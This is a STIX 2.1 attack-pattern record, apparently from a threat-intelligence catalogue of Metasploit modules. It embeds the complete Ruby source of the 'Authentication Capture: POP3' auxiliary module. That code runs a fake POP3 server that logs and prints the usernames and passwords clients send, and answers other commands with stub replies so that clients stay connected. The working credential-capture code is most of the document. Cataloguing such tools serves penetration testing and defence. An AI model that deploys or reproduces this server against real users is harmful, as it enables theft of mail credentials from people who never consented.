{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1aba24be-f450-43c4-ae1b-9690726237a9",
    "created": "2024-08-14T16:22:00.82288Z",
    "modified": "2024-08-14T16:22:00.822884Z",
    "name": "Authentication Capture: POP3",
    "description": " This module provides a fake POP3 service that is designed to capture authentication credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/pop3.rb",
            "external_id": "pop3.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n\n  def initialize\n    super(\n      'Name'        => 'Authentication Capture: POP3',\n      'Description'    => %q{\n        This module provides a fake POP3 service that\n      is designed to capture authentication credentials.\n      },\n      'Author'      => ['ddz', 'hdm'],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Capture' , 'Description' => 'Run POP3 capture server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Capture'\n        ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',    [ true, \"The local port to listen on.\", 110 ])\n      ])\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    @myhost = datastore['SRVHOST']\n    @myport = datastore['SRVPORT']\n    exploit()\n  end\n\n  def on_client_connect(c)\n    @state[c] = {:name => \"#{c.peerhost}:#{c.peerport}\", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}\n    c.put \"+OK\\r\\n\"\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_data(c)\n    data = c.get_once\n    return if not data\n    cmd,arg = data.strip.split(/\\s+/, 2)\n    arg ||= \"\"\n\n    if(cmd.upcase == \"USER\")\n      @state[c][:user] = arg\n      c.put \"+OK\\r\\n\"\n      return\n    end\n\n    if(cmd.upcase == \"PASS\")\n      @state[c][:pass] = arg\n\n      report_cred(\n        ip: @state[c][:ip],\n        port: @myport,\n        service_name: 'pop3',\n        user: @state[c][:user],\n        password: @state[c][:pass],\n        proof: arg\n      )\n      print_good(\"POP3 LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}\")\n      @state[c][:pass] = data.strip\n      c.put \"+OK\\r\\n\"\n      return\n    end\n\n    if(cmd.upcase == \"STAT\")\n      c.put \"+OK 0 0\\r\\n\"\n      return\n    end\n\n    if(cmd.upcase == \"CAPA\")\n      c.put \"-ERR No Extended Capabilities\\r\\n\"\n      return\n    end\n\n    if(cmd.upcase == \"LIST\")\n      c.put \"+OK 0 Messages\\r\\n\"\n      return\n    end\n\n    if(cmd.upcase == \"QUIT\" || cmd.upcase == \"RSET\" || cmd.upcase == \"DELE\")\n      c.put \"+OK\\r\\n\"\n      return\n    end\n\n    print_status(\"POP3 UNKNOWN CMD #{@state[c][:name]} \\\"#{data.strip}\\\"\")\n    c.put \"+OK\\r\\n\"\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\n\n\nend\n"
}